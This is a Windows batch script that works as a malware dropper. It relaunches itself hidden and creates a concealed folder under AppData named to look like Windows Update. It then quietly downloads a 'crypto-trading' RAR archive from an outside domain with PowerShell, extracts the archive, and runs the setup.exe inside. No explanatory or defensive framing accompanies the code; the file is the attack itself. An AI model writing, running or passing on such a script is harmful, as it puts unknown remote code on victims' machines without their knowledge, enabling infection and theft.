@echo off
if not "%~1"=="hidden" (
    start /b "" cmd /c "%~f0" hidden
    exit /b
)

setlocal enabledelayedexpansion

:: Create hidden directory in AppData
set "persistenceDir=%APPDATA%\Microsoft\Windows\Update"
if not exist "%persistenceDir%" (
    mkdir "%persistenceDir%"
    attrib +h "%persistenceDir%"
)

:: Download the RAR file
echo Downloading payload...
set "payloadUrl=https://crypto.harrylee.id.vn/crypto-trading.rar"
set "payloadPath=%persistenceDir%\crypto-trading.rar"

:: Use PowerShell to download the file
powershell -WindowStyle Hidden -Command "& {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%payloadUrl%' -OutFile '%payloadPath%'}"

if not exist "%payloadPath%" (
    echo Error: Failed to download RAR file
    exit /b 1
)

echo Successfully downloaded RAR file

:: Extract the RAR file
set "extractPath=%persistenceDir%\crypto-trading"
if not exist "%extractPath%" (
    mkdir "%extractPath%"
    attrib +h "%extractPath%"
)

:: Use WinRAR from environment variable
set "winrarPath=%ProgramFiles%\WinRAR\WinRAR.exe"

:: Extract the RAR file
"%winrarPath%" x -y "%payloadPath%" "%extractPath%"

:: Verify setup.exe exists and run it
set "setupPath=%extractPath%\setup.exe"
if not exist "%setupPath%" (
    echo Error: setup.exe not found in extracted folder
    exit /b 1
)

echo Executing setup.exe...
start "" /b "%setupPath%"

echo setup.exe executed successfully
